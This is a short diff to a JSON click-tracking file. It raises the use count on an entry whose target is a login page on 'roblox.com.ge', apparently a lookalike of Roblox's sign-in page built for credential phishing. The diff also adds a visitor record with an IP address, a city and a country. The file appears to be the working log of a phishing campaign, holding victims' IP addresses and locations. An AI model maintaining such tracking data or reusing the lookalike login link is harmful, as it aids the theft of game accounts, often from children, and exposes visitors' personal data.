@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1083,
+    "useCount": 1084,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8808,6 +8808,14 @@
         "city": "Bakersfield",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777256783193,
+        "ip": "1.55.38.156",
+        "country": "Vietnam",
+        "city": "Thị Trấn Phú Mỹ",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
